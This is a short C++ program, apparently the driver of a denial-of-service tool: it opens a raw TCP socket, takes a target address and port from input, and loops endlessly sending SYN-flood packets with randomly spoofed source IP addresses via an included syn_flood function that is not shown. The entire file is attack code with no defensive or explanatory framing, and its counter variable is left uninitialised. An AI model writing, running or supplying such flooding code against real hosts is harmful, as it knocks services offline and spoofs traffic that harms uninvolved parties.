#include"func/syn_flood.hpp"

int main(int argc, char* argv[])
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    int dport, sport, i;
    char a[30], addr_str[30];
    std::random_device r;
    std::cin >> a >> dport;

    while (1){
        std::sprintf(addr_str, "%u.%u.%u.%u",
            (unsigned int)r() % 255,
            (unsigned int)r() % 255,
            (unsigned int)r() % 255,
            (unsigned int)r() % 255);
            
        syn_flood(sock, a, addr_str, dport, r());
        std::cout << i++ << std::endl;
    }

    return 0;
}